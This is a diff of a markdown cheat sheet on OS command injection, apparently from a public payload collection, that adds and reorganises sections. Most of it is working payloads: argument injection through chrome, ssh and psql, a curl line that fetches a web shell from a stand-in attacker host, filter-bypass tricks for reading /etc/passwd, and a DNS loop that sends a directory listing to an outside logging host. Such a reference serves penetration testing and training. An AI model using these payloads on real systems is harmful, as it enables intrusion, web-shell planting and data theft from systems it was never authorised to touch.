@@ -2,35 +2,40 @@
 
 > Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.
 
+
 ## Summary
 
 * [Tools](#tools)
-* [Exploits](#exploits)
-  * [Basic commands](#basic-commands)
-  * [Chaining commands](#chaining-commands)
-  * [Inside a command](#inside-a-command)
+* [Methodology](#methodology)
+    * [Basic Commands](#basic-commands)
+    * [Chaining Commands](#chaining-commands)
+    * [Argument Injection](#argument-injection)
+    * [Inside A Command](#inside-a-command)
 * [Filter Bypasses](#filter-bypasses)
-  * [Bypass without space](#bypass-without-space)
-  * [Bypass with a line return](#bypass-with-a-line-return)
-  * [Bypass with backslash newline](#bypass-with-backslash-newline)
-  * [Bypass characters filter via hex encoding](#bypass-characters-filter-via-hex-encoding)
-  * [Bypass blacklisted words](#bypass-blacklisted-words)
-   * [Bypass with single quote](#bypass-with-single-quote)
-   * [Bypass with double quote](#bypass-with-double-quote)
-   * [Bypass with backslash and slash](#bypass-with-backslash-and-slash)
-   * [Bypass with $@](#bypass-with-)
-   * [Bypass with $()](#bypass-with--1)
-   * [Bypass with variable expansion](#bypass-with-variable-expansion)
-   * [Bypass with wildcards](#bypass-with-wildcards)
+    * [Bypass Without Space](#bypass-without-space)
+    * [Bypass With A Line Return](#bypass-with-a-line-return)
+    * [Bypass With Backslash Newline](#bypass-with-backslash-newline)
+    * [Bypass With Tilde Expansion](#bypass-with-tilde-expansion)
+    * [Bypass With Brace Expansion](#bypass-with-brace-expansion)
+    * [Bypass Characters Filter](#bypass-characters-filter)
+    * [Bypass Characters Filter Via Hex Encoding](#bypass-characters-filter-via-hex-encoding)
+    * [Bypass With Single Quote](#bypass-with-single-quote)
+    * [Bypass With Double Quote](#bypass-with-double-quote)
+    * [Bypass With Backticks](#bypass-with-backticks)
+    * [Bypass With Backslash And Slash](#bypass-with-backslash-and-slash)
+    * [Bypass With $@](#bypass-with-)
+    * [Bypass With $()](#bypass-with--1)
+    * [Bypass With Variable Expansion](#bypass-with-variable-expansion)
+    * [Bypass With Wildcards](#bypass-with-wildcards)
 * [Data Exfiltration](#data-exfiltration)
-  * [Time based data exfiltration](#time-based-data-exfiltration)
-  * [DNS based data exfiltration](#dns-based-data-exfiltration)
-* [Polyglot command injection](#polyglot-command-injection)
+    * [Time Based Data Exfiltration](#time-based-data-exfiltration)
+    * [Dns Based Data Exfiltration](#dns-based-data-exfiltration)
+* [Polyglot Command Injection](#polyglot-command-injection)
 * [Tricks](#tricks)
-  * [Backgrounding long running commands](#backgrounding-long-running-commands)
-  * [Remove arguments after the injection](#remove-arguments-after-the-injection)
+    * [Backgrounding Long Running Commands](#backgrounding-long-running-commands)
+    * [Remove Arguments After The Injection](#remove-arguments-after-the-injection)
 * [Labs](#labs)
-* [Challenge](#challenge)
+    * [Challenge](#challenge)
 * [References](#references)
 
 
@@ -40,7 +45,7 @@
 * [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) - An OOB interaction gathering server and client library
 
 
-## Exploits
+## Methodology
 
 Command injection, also known as shell injection, is a type of attack in which the attacker can execute arbitrary commands on the host operating system via a vulnerable application. This vulnerability can exist when an application passes unsafe user-supplied data (forms, cookies, HTTP headers, etc.) to a system shell. In this context, the system shell is a command-line interface that processes commands to be executed, typically on a Unix or Linux system.
 
@@ -63,7 +68,7 @@ If an attacker provides input like `8.8.8.8; cat /etc/passwd`, the actual comman
 This means the system would first `ping 8.8.8.8` and then execute the `cat /etc/passwd` command, which would display the contents of the `/etc/passwd` file, potentially revealing sensitive information.
 
 
-### Basic commands
+### Basic Commands
 
 Execute the command and voila :p
 
@@ -77,7 +82,7 @@ sys:x:3:3:sys:/dev:/bin/sh
 ```
 
 
-### Chaining commands
+### Chaining Commands
 
 In many command-line interfaces, especially Unix-like systems, there are several characters that can be used to chain or manipulate commands. 
 
@@ -97,7 +102,45 @@ command1 | command2  # Pipe the output of command1 into command2
 ```
 
 
-### Inside a command
+### Argument Injection
+
+Gain a command execution when you can only append arguments to an existing command.
+Use this website [Argument Injection Vectors - Sonar](https://sonarsource.github.io/argument-injection-vectors/) to find the argument to inject to gain command execution.
+
+* Chrome
+    ```ps1
+    chrome '--gpu-launcher="id>/tmp/foo"'
+    ```
+
+* SSH
+    ```ps1
+    ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
+    ```
+
+* psql
+    ```ps1
+    psql -o'|id>/tmp/foo'
+    ```
+
+Argument injection can be abused using the [worstfit](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/) technique.
+
+In the following example, the payload `＂ --use-askpass=calc ＂` is using **fullwidth double quotes** (U+FF02) instead of the **regular double quotes** (U+0022)
+
+```php
+$url = "https://example.tld/" . $_GET['path'] . ".txt";
+system("wget.exe -q " . escapeshellarg($url));
+```
+
+Sometimes, direct command execution from the injection might not be possible, but you may be able to redirect the flow into a specific file, enabling you to deploy a web shell.
+
+* curl
+    ```ps1
+    # -o, --output <file>        Write to file instead of stdout
+    curl http://evil.attacker.com/ -o webshell.php
+    ```
+    
+
+### Inside A Command
 
 * Command injection using backticks. 
   ```bash
@@ -111,9 +154,9 @@ command1 | command2  # Pipe the output of command1 into command2
 
 ## Filter Bypasses
 
-### Bypass without space
+### Bypass Without Space
 
-* `$IFS` is a special shell variable called the Internal Field Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command, the shell will interpret `$IFS` as a space. `$IFS` does not directly work as a seperator in commands like `ls`, `wget`; use `${IFS}` instead. 
+* `$IFS` is a special shell variable called the Internal Field Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command, the shell will interpret `$IFS` as a space. `$IFS` does not directly work as a separator in commands like `ls`, `wget`; use `${IFS}` instead. 
   ```powershell
   cat${IFS}/etc/passwd
   ls${IFS}-la
@@ -142,7 +185,7 @@ command1 | command2  # Pipe the output of command1 into command2
   ```
 
 
-### Bypass with a line return
+### Bypass With A Line Return
 
 Commands can also be run in sequence with newlines
 
@@ -152,7 +195,7 @@ ls
 ```
 
 
-### Bypass with backslash newline
+### Bypass With Backslash Newline
 
 * Commands can be broken into parts by using backslash followed by a newline
   ```powershell
@@ -166,7 +209,48 @@ ls
   ```
 
 
-### Bypass characters filter via hex encoding
+### Bypass With Tilde Expansion
+
+```powershell
+echo ~+
+echo ~-
+```
+
+### Bypass With Brace Expansion
+
+```powershell
+{,ip,a}
+{,ifconfig}
+{,ifconfig,eth0}
+{l,-lh}s
+{,echo,#test}
+{,$"whoami",}
+{,/?s?/?i?/c?t,/e??/p??s??,}
+```
+
+
+### Bypass Characters Filter
+
+Commands execution without backslash and slash - linux bash
+
+```powershell
+swissky@crashlab:~$ echo ${HOME:0:1}
+/
+
+swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab:~$ echo . | tr '!-0' '"-1'
+/
+
+swissky@crashlab:~$ tr '!-0' '"-1' <<< .
+/
+
+swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+root:x:0:0:root:/root:/bin/bash
+```
+
+### Bypass Characters Filter Via Hex Encoding
 
 ```powershell
 swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
@@ -194,51 +278,36 @@ swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 root:x:0:0:root:/root:/bin/bash
 ```
 
-
-### Bypass characters filter
-
-Commands execution without backslash and slash - linux bash
-
-```powershell
-swissky@crashlab:~$ echo ${HOME:0:1}
-/
-
-swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
-root:x:0:0:root:/root:/bin/bash
-
-swissky@crashlab:~$ echo . | tr '!-0' '"-1'
-/
-
-swissky@crashlab:~$ tr '!-0' '"-1' <<< .
-/
-
-swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
-root:x:0:0:root:/root:/bin/bash
-```
-
-
-### Bypass Blacklisted words
-
-#### Bypass with single quote
+### Bypass With Single Quote
 
 ```powershell
 w'h'o'am'i
+wh''oami
+'w'hoami
 ```
 
-#### Bypass with double quote
+### Bypass With Double Quote
 
 ```powershell
 w"h"o"am"i
+wh""oami
+"wh"oami
 ```
 
-#### Bypass with backslash and slash
+### Bypass With Backticks
+
+```powershell
+wh``oami
+```
+
+### Bypass With Backslash and Slash
 
 ```powershell
 w\ho\am\i
 /\b\i\n/////s\h
 ```
 
-#### Bypass with $@
+### Bypass With $@
 
 `$0`: Refers to the name of the script if it's being run as a script. If you're in an interactive shell session, `$0` will typically give the name of the shell.
 
@@ -248,7 +317,7 @@ echo whoami|$0
 ```
 
 
-#### Bypass with $()
+### Bypass With $()
 
 ```powershell
 who$()ami
@@ -256,7 +325,7 @@ who$(echo am)i
 who`echo am`i
 ```
 
-#### Bypass with variable expansion
+### Bypass With Variable Expansion
 
 ```powershell
 /???/??t /???/p??s??
@@ -266,7 +335,7 @@ cat ${test//hhh\/hm/}
 cat ${test//hh??hm/}
 ```
 
-#### Bypass with wildcards
+### Bypass With Wildcards
 
 ```powershell
 powershell C:\*\*2\n??e*d.*? # notepad
@@ -276,43 +345,45 @@ powershell C:\*\*2\n??e*d.*? # notepad
 
 ## Data Exfiltration
 
-### Time based data exfiltration
+### Time Based Data Exfiltration
 
-Extracting data : char by char
+Extracting data char by char and detect the correct value based on the delay.
 
-```powershell
-swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
-real    0m5.007s
-user    0m0.000s
-sys 0m0.000s
+* Correct value: wait 5 seconds
+  ```powershell
+  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
+  real    0m5.007s
+  user    0m0.000s
+  sys 0m0.000s
+  ```
 
-swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
-real    0m0.002s
-user    0m0.000s
-sys 0m0.000s
-```
+* Incorrect value: no delay
+  ```powershell
+  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
+  real    0m0.002s
+  user    0m0.000s
+  sys 0m0.000s
+  ```
 
-### DNS based data exfiltration
 
-Based on the tool from `https://github.com/HoLyVieR/dnsbin` also hosted at dnsbin.zhack.ca
+### Dns Based Data Exfiltration
 
-```powershell
+Based on the tool from [HoLyVieR/dnsbin](https://github.com/HoLyVieR/dnsbin), also hosted at [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)
+
 1. Go to http://dnsbin.zhack.ca/
 2. Execute a simple 'ls'
-for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
-```
-
-```powershell
-$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
-```
+  ```powershell
+  for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
+  ```
 
 Online tools to check for DNS based data exfiltration:
 
-- dnsbin.zhack.ca
-- pingb.in
+- http://dnsbin.zhack.ca/
+- https://app.interactsh.com/
+- Burp Collaborator
 
 
-## Polyglot command injection
+## Polyglot Command Injection
 
 A polyglot is a piece of code that is valid and executable in multiple programming languages or environments simultaneously. When we talk about "polyglot command injection," we're referring to an injection payload that can be executed in multiple contexts or environments.
 
@@ -338,7 +409,7 @@ A polyglot is a piece of code that is valid and executable in multiple programmi
 
 ## Tricks
 
-### Backgrounding long running commands
+### Backgrounding Long Running Commands
 
 In some instances, you might have a long running command that gets killed by the process injecting it timing out.
 Using `nohup`, you can keep the process running after the parent process exits.
@@ -347,21 +418,24 @@ Using `nohup`, you can keep the process running after the parent process exits.
 nohup sleep 120 > /dev/null &
 ```
 
-### Remove arguments after the injection
+### Remove Arguments After The Injection
 
 In Unix-like command-line interfaces, the `--` symbol is used to signify the end of command options. After `--`, all arguments are treated as filenames and arguments, and not as options.
 
 
 ## Labs
 
-* [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
-* [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
-* [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
-* [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
-* [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
+* [PortSwigger - OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
+* [PortSwigger - Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
+* [PortSwigger - Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
+* [PortSwigger - Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
+* [PortSwigger - Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
+* [Root Me - PHP - Command injection](https://www.root-me.org/en/Challenges/Web-Server/PHP-Command-injection)
+* [Root Me - Command injection - Filter bypass](https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass)
+* [Root Me - PHP - assert()](https://www.root-me.org/en/Challenges/Web-Server/PHP-assert)
+* [Root Me - PHP - preg_replace()](https://www.root-me.org/en/Challenges/Web-Server/PHP-preg_replace)
 
-
-## Challenge
+### Challenge
 
 Challenge based on the previous tricks, what does the following command do:
 
@@ -369,11 +443,18 @@ Challenge based on the previous tricks, what does the following command do:
 g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
 ```
 
+**NOTE**: The command is safe to run, but you should not trust me.
+
 
 ## References
 
-* [SECURITY CAFÉ - Exploiting Timed Based RCE](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
-* [Bug Bounty Survey - Windows RCE spaceless](https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136)
-* [No PHP, no spaces, no $, no { }, bash only - @asdizzle](https://twitter.com/asdizzle_/status/895244943526170628)
-* [#bash #obfuscation by string manipulation - Malwrologist, @DissectMalware](https://twitter.com/DissectMalware/status/1025604382644232192)
-* [What is OS command injection - portswigger](https://portswigger.net/web-security/os-command-injection)
+- [Argument Injection and Getting Past Shellwords.escape - Etienne Stalmans - November 24, 2019](https://staaldraad.github.io/post/2019-11-24-argument-injection/)
+- [Argument Injection Vectors - SonarSource - February 21, 2023](https://sonarsource.github.io/argument-injection-vectors/)
+- [Back to the Future: Unix Wildcards Gone Wild - Leon Juranic - June 25, 2014](https://www.exploit-db.com/papers/33930)
+- [Bash Obfuscation by String Manipulation - Malwrologist, @DissectMalware - August 4, 2018](https://twitter.com/DissectMalware/status/1025604382644232192)
+- [Bug Bounty Survey - Windows RCE Spaceless - Bug Bounties Survey - May 4, 2017](https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136)
+- [No PHP, No Spaces, No $, No {}, Bash Only - Sven Morgenroth - August 9, 2017](https://twitter.com/asdizzle_/status/895244943526170628)
+- [OS Command Injection - PortSwigger - 2024](https://portswigger.net/web-security/os-command-injection)
+- [SECURITY CAFÉ - Exploiting Timed-Based RCE - Pobereznicenco Dan - February 28, 2017](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
+- [TL;DR: How to Exploit/Bypass/Use PHP escapeshellarg/escapeshellcmd Functions - kacperszurek - April 25, 2018](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)
+- [WorstFit: Unveiling Hidden Transformers in Windows ANSI! - Orange Tsai - January 10, 2025](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/)
